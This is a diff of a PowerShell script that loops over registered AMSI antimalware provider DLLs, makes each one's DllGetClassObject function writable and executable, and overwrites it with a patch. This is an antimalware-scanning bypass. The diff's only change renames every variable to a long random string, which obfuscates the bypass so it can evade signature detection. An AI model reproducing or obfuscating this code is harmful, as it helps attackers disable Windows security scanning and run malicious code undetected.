@@ -1,18 +1,18 @@
-foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
+foreach ($JYOnzgBLFNOFSknMxMBrDIapNFlvTbcuBhNep in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
 {
-    $registry = 'HKLM:\Software\Classes\CLSID\' + $provider + '\InprocServer32'
-    $dllPath = Get-ItemPropertyValue -Name '(Default)' $registry -ErrorAction SilentlyContinue
-    if ($dllPath)
+    $bWwnlpiJrHklKaURntlelpqpDspIvgNTBXYdh = 'HKLM:\Software\Classes\CLSID\' + $JYOnzgBLFNOFSknMxMBrDIapNFlvTbcuBhNep + '\InprocServer32'
+    $HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr = Get-ItemPropertyValue -Name '(Default)' $bWwnlpiJrHklKaURntlelpqpDspIvgNTBXYdh -ErrorAction SilentlyContinue
+    if ($HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr)
     {
-        $providerDLL = Split-Path $dllPath -leaf
-        $dll = $providerDLL -replace '"', ""
-        $hDLL = $LoadLibrary.Invoke($dll) 
-        if ($hdll -ne 0)
+        $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf = Split-Path $HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr -leaf
+        $aILpijVvncfzjaazhIIEcsovDolfrljcHgRifbjl = $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf -replace '"', ""
+        $BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK = $mjWCdQCbAWoAAiuIGpBPTpWfpCbzvuMWxMwpg.Invoke($aILpijVvncfzjaazhIIEcsovDolfrljcHgRifbjl) 
+        if ($BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK -ne 0)
         {
-            Write-host "[*] Provider found - " $providerDLL
-            $Address = $GetProcAddress.Invoke($hDLL, "DllGetClassObject")        
-            $VirtualProtect.Invoke($Address, [uint32]$Patch.Length, 0x40, [ref]$p)
-            [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
+            Write-host "[*] Provider found - " $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf
+            $QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX = $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL.Invoke($BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK, "DllGetClassObject")        
+            $gQpjpZSYweJRJjjDUERR.Invoke($QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX, [uint32]$otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ.Length, 0x40, [ref]$fEdHliqJDxoHggMKvaVQAQalfYTujScnzYiaovjFamoJW)
+            [System.Runtime.InteropServices.Marshal]::Copy($otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ, 0, $QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX, $otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ.Length)
         }
     }
 }
